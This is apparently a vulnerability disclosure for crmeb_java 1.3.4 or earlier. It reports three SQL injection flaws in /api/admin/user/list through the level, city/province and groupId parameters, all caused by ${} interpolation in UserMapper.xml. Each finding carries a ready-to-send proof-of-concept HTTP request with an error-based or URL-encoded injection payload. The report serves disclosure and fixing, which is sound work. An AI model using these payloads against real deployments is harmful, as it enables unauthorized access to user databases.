# Project
Address: [crmeb_java](https://github.com/crmeb/crmeb_java)

Version: [crmeb_java_1.3.4](https://github.com/crmeb/crmeb_java.git)

# 1 SQL Injection
## 1.1 The level `parameter` is not filtered, resulting in SQL injection

[Suggested description]

There is a SQL Injection vulnerability in crmeb_java <=1.3.4, caused by params `parameter` which are in `${}` format and are not strictly filtered.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=&payCount=&accessType=0&dateLimit=&keywords=&province=&city=&page=1&limit=15&level=1+and+extractvalue(1,CONCAT(1,user()))&groupId=&temp=1704955767 HTTP/1.1
Host: 127.0.0.1:8080
Accept: application/json, text/plain, */*
Authori-zation: cc12fe38c271486eb4f1cafbf59a0c41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8290d506-967a-44cd-a344-80c498bcb533)

The vulnerability triggering parameter is "level" :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f38039a9-27ae-4ab1-87d8-37985c5a946a)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/11953e5c-a301-4eca-8ebf-ce756da32ac2)

[Code analysis]

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be pre-compiled, so the vulnerability.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c8533dad-f533-4513-9be4-7fa8c8d370f6)

## 1.2 The parameters `city` and `province` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB <=1.3.4 There is an SQL injection vulnerability in parameters `city` and `province` at the interface: /api/admin/user/list, which could allow an attacker to obtain sensitive information from the database.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
/api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=&city=%27%20%41%4e%44%20%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%37%61%37%31%36%61%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%35%38%31%31%3d%35%38%31%31%2c%31%29%29%29%2c%30%78%37%31%37%30%36%61%37%38%37%31%29%2c%35%38%31%31%29%2d%2d%20%6c%72%68%73&page=1&limit=15&level=&groupId=1&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```
OR

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=%27%20%41%4e%44%20%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%36%61%37%36%36%61%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%39%32%34%32%3d%39%32%34%32%2c%31%29%29%29%2c%30%78%37%31%37%31%37%30%36%62%37%31%29%2c%39%32%34%32%29%2d%2d%20%73%50%4b%4c&city=1&page=1&limit=15&level=&groupId=1&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d7db343e-bdeb-462e-bbd8-3c268a410389)

The vulnerability trigger parameter is `city` or `province` :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e449196b-b7f2-44c6-99f3-bfc7673c4b6a)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/a24d24e2-d768-4026-9e3c-084ccd1a4dad)

Use sqlmap to get database users:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/66ee96c7-aaae-4d9b-858c-1bbd80b80308)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/92de51d5-89f4-4e7b-b260-0eda578faf1d)

[Code analysis]

Call: userService.getList() for the next step:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fd12ea20-46d4-4bf2-82f4-243097e03a56)

If the `city` parameter is not empty, then encapsulate `province` and `city` together into the Map: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/ee885d83-cb49-4c62-bf12-a344f89be102)

After wrapping the map, start calling findAdminList() for processing: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2d305abd-59dc-484d-b56c-bd4494339245)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8e0831cc-a774-4c2d-afb8-84727e7f91d1)

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be precompiled, so the vulnerability. 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9b06e31f-8b86-403b-854d-c592976f4180)

## 1.3 The parameters `groupId` are not filtered, resulting in SQL injection

[Suggested description]

CRMEB <=1.3.4 There is an SQL injection vulnerability in parameters `groupId` at the interface: /api/admin/user/list, which could allow an attacker to obtain sensitive information from the database.

[Vendor of Product]

https://github.com/crmeb/crmeb_java

[Affected Product Code Base]

<=1.3.4

[Affected Component]

/api/admin/user/list

POC

```
GET /api/admin/user/list?labelId=&userType=&sex=&isPromoter=&country=foo&payCount=&accessType=0&dateLimit=&keywords=&province=&city=1&page=1&limit=15&level=&groupId=%47%54%49%44%5f%53%55%42%53%45%54%28%43%4f%4e%43%41%54%28%30%78%37%31%37%36%37%36%37%31%37%31%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%34%35%31%32%3d%34%35%31%32%2c%31%29%29%29%2c%30%78%37%31%36%32%37%30%37%31%37%31%29%2c%34%35%31%32%29&temp=1678934444 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Authori-zation: f00be952bb304478b7ec43e87f06d0b4


```

[Vulnerability recurrence]

The trigger point of the vulnerability is in "User Management" --> "Search".

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d7db343e-bdeb-462e-bbd8-3c268a410389)

The vulnerability trigger parameter is "groupId" :

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fb080b6b-2fb0-45cf-a5b1-81c4d541848d)

Use sqlmap to get database users:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/f3e0c034-cf98-450d-8ddf-2da9e862cb13)

[Code analysis]

Call: userService.getList() for the next step:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9eb36077-ae17-4a53-9b38-518cd487c7ab)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/cfd44309-8170-488f-9f96-79e08997f30c)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/0eb1e9e9-3b62-49ca-bf02-76d317f5a14e)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/46f28e1a-5071-4dfb-b516-b558708abd05)

The corresponding xml file is UserMapper.xml, because it is wrapped by `${`, and this writing will not be pre-compiled, so the vulnerability.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/17a723e7-ab56-465b-852c-c1dba518dced)






























































